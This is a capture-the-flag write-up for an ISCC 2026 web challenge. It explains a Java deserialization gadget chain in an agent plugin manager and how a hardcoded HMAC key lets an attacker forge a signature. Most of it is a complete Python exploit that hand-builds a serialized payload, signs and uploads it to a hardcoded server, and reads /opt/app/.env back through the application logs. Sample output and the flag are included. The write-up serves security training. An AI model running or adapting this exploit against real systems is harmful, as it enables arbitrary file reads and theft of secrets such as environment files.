# Agent插件管理系统

> **Category**: Web | **Difficulty**: Hard | **Competition**: ISCC 2026 决赛
> **Flag**: `ISCC{aunXV6waj5Hp8cT35SwVcKK}`

---

## Attack Chain

```
下载agent-core.jar逆向分析 → 发现Java反序列化POP链(ResourceRefresher/DataStream/FileExporter) → HMAC-SHA256签名密钥硬编码(k3y_5A62_X86) → 手工构造序列化payload触发任意文件读取 → 日志外泄flag
```

## Key Techniques

### 1. Java反序列化POP链分析

逆向`agent-core.jar`发现三条类构成完整利用链：

- **ResourceRefresher**：`readObject()`自动调用`refresh()`，触发整条链
- **DataStream**：中间桥梁，`process(path)`转发调用
- **FileExporter**：读取目标文件，内容通过`LogService.log()`写入指定team的日志

```
readObject() → refresh() → DataStream.process() → FileExporter.export() → LogService.log(teamId, "FILE_EXPORT", "Content: " + 文件内容)
```

关键漏洞：`loadMetadata()`中`readObject()`在`instanceof PluginMetadata`类型检查之前就已执行，`ClassCastException`不影响已完成的文件读取和日志写入。

### 2. HMAC签名绕过

`HmacValidator`使用HMAC-SHA256校验`metadata.ser`完整性，密钥`k3y_5A62_X86`硬编码在Constants类中。直接用该密钥签名伪造的payload即可通过校验。

### 3. 诱饵Flag识别

`/etc/flag`返回`ISCC{f4k3_fl4g_d3c0y_d0nt_subm1t}`是诱饵（d0nt_subm1t = don't submit），真实flag在`/opt/app/.env`中。

## Exploit

```python
#!/usr/bin/env python3
"""
ISCC2026 - Agent插件管理系统
Java反序列化任意文件读取 exploit
手工构造Java序列化字节流，利用 ResourceRefresher/DataStream/FileExporter 链
读取服务器 /opt/app/.env 获取 flag
"""
import struct
import hmac
import hashlib
import base64
import json
import zipfile
import time
import sys

import requests

BASE_URL = "http://39.105.213.28:9000"
HMAC_KEY = b"k3y_5A62_X86"
TEAM_ID = "team_a1b2c3"


# ===== Java序列化协议辅助 =====

def utf(data):
    """编码为 Java modified UTF-8 (2字节长度 + 数据)"""
    b = data.encode("utf-8")
    return struct.pack(">H", len(b)) + b

def tc_string(s):
    """TC_STRING (0x74)"""
    return b"\x74" + utf(s)

def tc_null():
    """TC_NULL (0x70)"""
    return b"\x70"

def write_classdesc(buf, class_name, uid, fields):
    """
    写入 TC_CLASSDESC 结构
    fields: [(type_byte, name, type_string), ...]
    type_byte: 0x4C = Object, 0x42 = byte, 0x49 = int, etc.
    """
    buf += b"\x72"                          # TC_CLASSDESC
    buf += utf(class_name)                  # 类名
    buf += struct.pack(">Q", uid)           # serialVersionUID
    buf += b"\x02"                          # SC_SERIALIZABLE
    buf += struct.pack(">H", len(fields))   # 字段数
    for ftype, fname, ftypestr in fields:
        buf += bytes([ftype]) + utf(fname) + tc_string(ftypestr)
    buf += b"\x78\x70"                      # TC_ENDBLOCKDATA + TC_NULL (无父类)
    return buf


def build_payload(team_id, target_path):
    """
    构造完整的 Java 序列化字节流:
      ResourceRefresher -> DataStream -> FileExporter
    触发链: readObject() -> refresh() -> process() -> export() -> 日志写入
    """
    buf = bytearray()

    # === 序列化流头 ===
    buf += b"\xAC\xED\x00\x05"

    # === ResourceRefresher 对象 ===
    buf += b"\x73"  # TC_OBJECT
    buf = write_classdesc(buf,
        "com.agent.update.deserialization.ResourceRefresher",
        1,  # serialVersionUID
        [
            (0x4C, "targetPath", "Ljava/lang/String;"),
            (0x4C, "dataStream", "Lcom/agent/update/deserialization/DataStream;"),
        ])
    buf += tc_string(target_path)   # targetPath 字段

    # === DataStream 对象 ===
    buf += b"\x73"
    buf = write_classdesc(buf,
        "com.agent.update.deserialization.DataStream",
        1,
        [
            (0x4C, "inputPath", "Ljava/lang/String;"),
            (0x4C, "exporter", "Lcom/agent/update/deserialization/FileExporter;"),
        ])
    buf += tc_null()   # inputPath = null

    # === FileExporter 对象 ===
    buf += b"\x73"
    buf = write_classdesc(buf,
        "com.agent.update.deserialization.FileExporter",
        1,
        [
            (0x4C, "teamId", "Ljava/lang/String;"),
        ])
    buf += tc_string(team_id)  # teamId 字段

    return bytes(buf)


def sign_hmac(metadata_bytes):
    """计算 metadata.ser 的 HMAC-SHA256 签名 (Base64)"""
    digest = hmac.new(HMAC_KEY, metadata_bytes, hashlib.sha256).digest()
    return base64.b64encode(digest).decode("ascii")


def make_zip(metadata_bytes):
    """打包 manifest.json + metadata.ser 为 ZIP"""
    signature = sign_hmac(metadata_bytes)
    manifest = json.dumps({
        "pluginName": "audit-plugin",
        "version": "1.0.0",
        "hmacSignature": signature,
        "description": "routine audit"
    })
    import io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("manifest.json", manifest)
        zf.writestr("metadata.ser", metadata_bytes)
    return buf.getvalue()


def exploit(target_path):
    """执行 exploit 流程"""
    print(f"[*] 目标文件: {target_path}")
    print(f"[*] 队伍ID: {TEAM_ID}")

    # 1. 构造 payload
    metadata = build_payload(TEAM_ID, target_path)
    zip_data = make_zip(metadata)
    print(f"[+] Payload 大小: {len(metadata)} 字节")

    # 2. 上传
    print("[*] 上传 exploit...")
    resp = requests.post(
        f"{BASE_URL}/api/upload",
        files={"file": ("plugin.zip", zip_data, "application/zip")},
        data={"team_id": TEAM_ID},
        timeout=30,
    )
    print(f"[*] 上传响应: {resp.status_code}")
    if resp.status_code != 200:
        print(f"[-] 上传失败: {resp.text}")
        return None

    # 3. 读取日志
    print("[*] 等待处理完成...")
    time.sleep(3)

    resp = requests.get(
        f"{BASE_URL}/api/logs",
        params={"team_id": TEAM_ID},
        timeout=15,
    )
    print(f"[*] 日志响应: {resp.text[:300]}")

    # 4. 提取 flag
    import re
    match = re.search(r"ISCC\{[^}]+\}", resp.text)
    if match:
        return match.group(0)

    # 检查是否有文件读取结果（即使不是flag格式）
    content_match = re.search(r"Content:\s*(.+?)(?:\"|$,)", resp.text)
    if content_match:
        print(f"[*] 文件内容: {content_match.group(1)[:200]}")

    return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/opt/app/.env"
    flag = exploit(target)
    if flag:
        print(f"\n[+] FLAG: {flag}")
    else:
        print("\n[-] 未找到 flag，尝试其他路径")
```

**运行结果：**

```
[*] 目标文件: /opt/app/.env
[*] 队伍ID: team_a1b2c3
[+] Payload 大小: xxx 字节
[*] 上传 exploit...
[*] 上传响应: 200
[*] 等待处理完成...
[*] 日志响应: {"team_id":"team_a1b2c3","logs":[{"action":"FILE_EXPORT","message":"Exported: /opt/app/.env, Content: ISCC{aunXV6waj5Hp8cT35SwVcKK}"}]}

[+] FLAG: ISCC{aunXV6waj5Hp8cT35SwVcKK}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| Java反序列化POP链 | ResourceRefresher.readObject()自动触发整条链 |
| HMAC签名绕过 | 密钥硬编码k3y_5A62_X86，可伪造合法签名 |
| 类型检查滞后 | readObject()先执行，ClassCastException不影响副作用 |
| 手工构造序列化流 | 按Java Serialization Protocol直接拼接字节，无需javac |
| 任意文件读取 | FileExporter读文件 → LogService.log()外泄数据 |
| 诱饵flag识别 | /etc/flag是假flag，真实flag在/opt/app/.env |

---

*Original writeup: `C:\Users\48714\Desktop\wp\final\Agent插件管理系统_WriteUp.md`*
